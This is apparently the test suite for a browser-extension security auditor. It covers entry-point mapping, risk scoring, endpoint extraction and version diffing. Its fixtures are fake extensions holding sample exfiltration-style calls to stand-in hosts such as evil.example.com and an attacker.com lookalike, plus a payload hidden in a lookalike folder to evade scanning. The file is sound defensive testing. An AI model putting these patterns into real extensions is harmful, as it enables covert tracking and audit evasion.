import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { auditExtension, collectEndpointsFromContent } from '../src/audit.js';
import { buildEntryPointMap } from '../src/map.js';
import { diffExtensions } from '../src/diff.js';
import { summarizeManifest } from '../src/manifest.js';

function makeExtension(dir, { manifest, files }) {
  writeFileSync(path.join(dir, 'manifest.json'), JSON.stringify(manifest, null, 2));
  for (const [rel, content] of Object.entries(files)) {
    const full = path.join(dir, rel);
    mkdirSync(path.dirname(full), { recursive: true });
    writeFileSync(full, content);
  }
}

test('buildEntryPointMap finds background and content scripts', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-map-'));
  const manifest = {
    name: 'Test Ext',
    version: '1.0.0',
    manifest_version: 3,
    background: { service_worker: 'bg.js' },
    action: { default_popup: 'popup.html' },
    content_scripts: [{ matches: ['https://*/*'], js: ['content.js'] }],
  };
  makeExtension(dir, {
    manifest,
    files: {
      'bg.js': 'console.log("bg");\n',
      'content.js': 'const x=1;',
      'popup.html': '<script src="popup.js"></script>',
      'popup.js': 'console.log("popup");',
    },
  });

  const map = buildEntryPointMap(dir, manifest);
  assert.equal(map.entryPoints.background, 'bg.js');
  assert.equal(map.entryPoints.popup.html, 'popup.html');
  assert.deepEqual(map.entryPoints.popup.scripts, ['popup.js']);
  assert.equal(map.entryPoints.contentScripts.length, 1);
  assert.ok(map.startHere.includes('manifest.json'));
  assert.ok(map.startHere.includes('bg.js'));
  rmSync(dir, { recursive: true });
});

test('auditExtension flags risky permissions and patterns', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = {
    name: 'Spy Ext',
    version: '2.0.0',
    manifest_version: 3,
    permissions: ['cookies', 'storage'],
    host_permissions: ['<all_urls>'],
    background: { service_worker: 'bg.js' },
  };
  const summary = {
    name: 'Spy Ext',
    version: '2.0.0',
    permissions: ['cookies', 'storage'],
    optionalPermissions: [],
    hostPermissions: ['<all_urls>'],
    contentScripts: [],
    background: 'bg.js',
  };
  makeExtension(dir, {
    manifest,
    files: {
      'bg.js': 'eval("bad"); fetch("https://evil.example.com/track");',
    },
  });

  const audit = auditExtension(dir, manifest, summary);
  assert.ok(['high', 'critical'].includes(audit.risk.level));
  assert.ok(audit.permissions.high.includes('cookies'));
  assert.ok(audit.findings.some((f) => f.pattern === 'eval()'));
  assert.ok(audit.endpoints.includes('https://evil.example.com/track'));
  rmSync(dir, { recursive: true });
});

test('auditExtension scores optional_host_permissions and flags a custom update_url', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = {
    name: 'Sneaky Ext', version: '1.0.0', manifest_version: 3,
    permissions: ['storage'],
    optional_host_permissions: ['<all_urls>'],
    update_url: 'https://not-the-store.example.com/update.xml',
    background: { service_worker: 'bg.js' },
  };
  const summary = summarizeManifest(manifest);
  makeExtension(dir, { manifest, files: { 'bg.js': 'console.log("ok");' } });

  const audit = auditExtension(dir, manifest, summary);
  assert.ok(audit.permissions.high.includes('<all_urls>'));
  assert.ok(audit.flags.some((f) => f.label.includes('update_url')));
  rmSync(dir, { recursive: true });
});

test('scanSource flags fetch, WebSocket, sendMessage, and executeScript', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = { name: 'Ext', version: '1.0.0', manifest_version: 3, permissions: [], background: { service_worker: 'bg.js' } };
  const summary = summarizeManifest(manifest);
  makeExtension(dir, {
    manifest,
    files: {
      'bg.js': [
        'fetch("https://api.example.com/collect");',
        'const ws = new WebSocket("wss://api.example.com/socket");',
        'chrome.runtime.sendMessage({ type: "ping" });',
        'chrome.scripting.executeScript({ target: { tabId: 1 }, func: () => {} });',
      ].join('\n'),
    },
  });

  const audit = auditExtension(dir, manifest, summary);
  const patterns = audit.findings.map((f) => f.pattern);
  assert.ok(patterns.includes('fetch()'));
  assert.ok(patterns.includes('new WebSocket()'));
  assert.ok(patterns.includes('chrome.runtime.sendMessage/connect'));
  assert.ok(patterns.includes('chrome.scripting.executeScript / tabs.executeScript'));
  rmSync(dir, { recursive: true });
});

test('auditExtension does not double-count a bundle superseded by its .unpacked copy', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = {
    name: 'Bundled Ext', version: '1.0.0', manifest_version: 3,
    permissions: ['storage'],
    background: { service_worker: 'bundle.js' },
  };
  const summary = {
    name: 'Bundled Ext', version: '1.0.0', permissions: ['storage'],
    optionalPermissions: [], hostPermissions: [], contentScripts: [], background: 'bundle.js',
  };
  makeExtension(dir, {
    manifest,
    files: { 'bundle.js': 'eval("original"); fetch("https://original.example.com");' },
  });
  // Simulate what deobfuscateDirectory leaves behind after unpacking a bundle.
  mkdirSync(path.join(dir, 'bundle.unpacked'));
  writeFileSync(
    path.join(dir, 'bundle.unpacked', 'module.js'),
    'eval("original"); fetch("https://original.example.com");'
  );

  const audit = auditExtension(dir, manifest, summary);
  const evalFindings = audit.findings.filter((f) => f.pattern === 'eval()');
  assert.equal(evalFindings.length, 1); // only from bundle.unpacked/module.js, not bundle.js too
  assert.equal(evalFindings[0].file, 'bundle.unpacked/module.js');
  assert.deepEqual(audit.endpoints, ['https://original.example.com']);
  rmSync(dir, { recursive: true });
});

test('computeRisk does not let repeated hits of one pattern in one file dominate the score', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = { name: 'Chatty Lib', version: '1.0.0', manifest_version: 3, permissions: ['storage'], background: { service_worker: 'bg.js' } };
  const summary = summarizeManifest(manifest);
  makeExtension(dir, {
    manifest,
    files: { 'bg.js': Array.from({ length: 50 }, () => 'eval("x");').join('\n') },
  });

  const audit = auditExtension(dir, manifest, summary);
  // 50 raw eval() hits in one file, but risk scoring should treat it as one
  // distinct (file, pattern) signal, not 50 — low/medium/high, not critical.
  assert.notEqual(audit.risk.level, 'critical');
  assert.equal(audit.findings.filter((f) => f.pattern === 'eval()').length, 50); // detail list unchanged
  rmSync(dir, { recursive: true });
});

test('collectEndpointsFromContent extracts URLs', () => {
  const eps = collectEndpointsFromContent('fetch("https://api.example.com/v1")');
  assert.deepEqual(eps, ['https://api.example.com/v1']);
});

test('collectEndpointsFromContent excludes only exact mozilla.org/w3.org hosts, not attacker lookalikes', () => {
  const content = [
    'fetch("https://developer.mozilla.org/docs")',
    'fetch("https://www.w3.org/TR/spec")',
    'fetch("https://evilmozilla.org.attacker.com/steal")',
    'fetch("https://api.example.com/collect")',
  ].join('\n');

  const eps = collectEndpointsFromContent(content).sort();
  assert.deepEqual(eps, ['https://api.example.com/collect', 'https://evilmozilla.org.attacker.com/steal'].sort());
});

test('diffExtensions detects permission and file changes', () => {
  const left = mkdtempSync(path.join(tmpdir(), 'crxray-left-'));
  const right = mkdtempSync(path.join(tmpdir(), 'crxray-right-'));

  makeExtension(left, {
    manifest: {
      name: 'Ext',
      version: '1.0.0',
      manifest_version: 3,
      permissions: ['storage'],
    },
    files: { 'a.js': 'const a = 1;', 'old.js': 'x' },
  });

  makeExtension(right, {
    manifest: {
      name: 'Ext',
      version: '1.1.0',
      manifest_version: 3,
      permissions: ['storage', 'tabs'],
      host_permissions: ['https://*/*'],
    },
    files: { 'a.js': 'const a = 2;', 'new.js': 'y' },
  });

  const diff = diffExtensions(left, right);
  assert.equal(diff.left.version, '1.0.0');
  assert.equal(diff.right.version, '1.1.0');
  assert.deepEqual(diff.permissionChanges.added, ['tabs']);
  assert.deepEqual(diff.permissionChanges.hostAdded, ['https://*/*']);
  assert.deepEqual(diff.files.added, ['new.js']);
  assert.deepEqual(diff.files.removed, ['old.js']);
  const modifiedPaths = diff.files.modified.map((m) => m.path);
  assert.ok(modifiedPaths.includes('a.js'));
  assert.ok(modifiedPaths.includes('manifest.json'));

  rmSync(left, { recursive: true });
  rmSync(right, { recursive: true });
});

test('diffExtensions reports endpoints from added and removed files, not just modified ones', () => {
  const left = mkdtempSync(path.join(tmpdir(), 'crxray-left-'));
  const right = mkdtempSync(path.join(tmpdir(), 'crxray-right-'));

  makeExtension(left, {
    manifest: { name: 'Ext', version: '1.0.0', manifest_version: 3 },
    files: { 'old.js': 'fetch("https://old-only.example.com")' },
  });
  makeExtension(right, {
    manifest: { name: 'Ext', version: '1.1.0', manifest_version: 3 },
    files: { 'new.js': 'fetch("https://new-only.example.com")' },
  });

  const diff = diffExtensions(left, right);
  assert.deepEqual(diff.endpointChanges.added, ['https://new-only.example.com']);
  assert.deepEqual(diff.endpointChanges.removed, ['https://old-only.example.com']);

  rmSync(left, { recursive: true });
  rmSync(right, { recursive: true });
});

test('auditExtension never scans files inside a <name>.wakaru directory with a sibling <name>.js', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  writeFileSync(path.join(dir, 'bundle.js'), 'minified');
  mkdirSync(path.join(dir, 'bundle.wakaru'));
  writeFileSync(path.join(dir, 'bundle.wakaru', 'module-0.js'), 'eval("danger"); fetch("https://evil.example.com");');
  writeFileSync(path.join(dir, 'clean.js'), 'console.log("fine");');

  const audit = auditExtension(dir, null, null);
  assert.equal(audit.findings.length, 0);
  assert.equal(audit.endpoints.length, 0);
  rmSync(dir, { recursive: true });
});

test('auditExtension still scans a shipped <name>.wakaru lookalike with no sibling <name>.js', () => {
  // A directory named like wakaru's own output convention, but with no
  // corresponding original .js file next to it, is not provably crxray's
  // own output — an extension could ship one deliberately to hide code
  // from the auditor. It must still be scanned.
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  mkdirSync(path.join(dir, 'evil.wakaru'));
  writeFileSync(path.join(dir, 'evil.wakaru', 'payload.js'), 'eval("danger"); fetch("https://evil.example.com");');

  const audit = auditExtension(dir, null, null);
  assert.equal(audit.findings.length, 2);
  assert.equal(audit.endpoints.length, 1);
  rmSync(dir, { recursive: true });
});

test('buildEntryPointMap readability stats ignore files inside a <name>.wakaru directory with a sibling <name>.js', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-map-'));
  writeFileSync(path.join(dir, 'bundle.js'), 'x'.repeat(2000));
  mkdirSync(path.join(dir, 'bundle.wakaru'));
  writeFileSync(path.join(dir, 'bundle.wakaru', 'module-0.js'), 'x'.repeat(2000));
  writeFileSync(path.join(dir, 'clean.js'), 'console.log("fine");\n');

  const map = buildEntryPointMap(dir, null);
  assert.equal(map.readability.total, 2);
  assert.equal(map.readability.files.length, 2);
  assert.deepEqual(
    map.readability.files.map((f) => f.file).sort(),
    ['bundle.js', 'clean.js']
  );
  rmSync(dir, { recursive: true });
});

test('buildEntryPointMap still counts a shipped <name>.wakaru lookalike with no sibling <name>.js', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-map-'));
  mkdirSync(path.join(dir, 'evil.wakaru'));
  writeFileSync(path.join(dir, 'evil.wakaru', 'payload.js'), 'x'.repeat(2000));

  const map = buildEntryPointMap(dir, null);
  assert.equal(map.readability.total, 1);
  assert.equal(map.readability.files[0].file, path.join('evil.wakaru', 'payload.js'));
  rmSync(dir, { recursive: true });
});
